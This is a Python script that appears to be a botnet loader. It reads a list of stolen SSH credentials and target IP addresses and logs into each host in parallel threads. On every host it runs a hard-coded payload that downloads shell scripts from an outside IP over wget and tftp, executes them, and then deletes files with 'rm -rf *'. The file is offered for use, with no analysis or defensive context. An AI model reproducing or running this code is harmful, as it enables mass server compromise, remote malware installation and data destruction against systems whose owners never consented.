import sys
import paramiko
import threading


PAYLOAD = "cd /tmp || cd /run || cd /; wget http://45.95.147.91/jsdfgbins.sh; chmod 777 jsdfgbins.sh; sh jsdfgbins.sh; tftp 45.95.147.91 -c get jsdfgtftp1.sh; chmod 777 jsdfgtftp1.sh; sh jsdfgtftp1.sh; tftp -r jsdfgtftp2.sh -g 45.95.147.91; chmod 777 jsdfgtftp2.sh; sh jsdfgtftp2.sh; rm -rf jsdfgbins.sh jsdfgtftp1.sh jsdfgtftp2.sh; rm -rf *"

def load(username, password, ip):
    sshobj = paramiko.SSHClient()
    sshobj.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        sshobj.connect(ip, username=username, password=password, port=22, look_for_keys=True, timeout=10)
        print("\x1b[32m[+]\x1b[0;37m Logged In -> " + ip + " " + username + ":" + password + "")
    except Exception as e:
        # paramiko raises SSHException('No authentication methods available',) since we did not specify any auth methods. socket stays open.
        print("\x1b[31m[-]\x1b[0;37m " + ip + " " + username + ":" + password + " >> Exception: "+str(e))
        return
    stdin, stdout, stderr = sshobj.exec_command(PAYLOAD)
    print("\x1b[1;33m[?]\x1b[0;37m Server output: "+"".join(stdout.readlines()).strip())
if not len(sys.argv) > 1:
    print("\x1b[31m[-]\x1b[0;37m " + sys.argv[0] + " <file to load>")
    exit(-1)
with open(sys.argv[1], "r") as file:
    for server in file:
        splitted = server.split(":")
        threading.Thread(target=load, args=(splitted[0], splitted[1], splitted[2])).start()

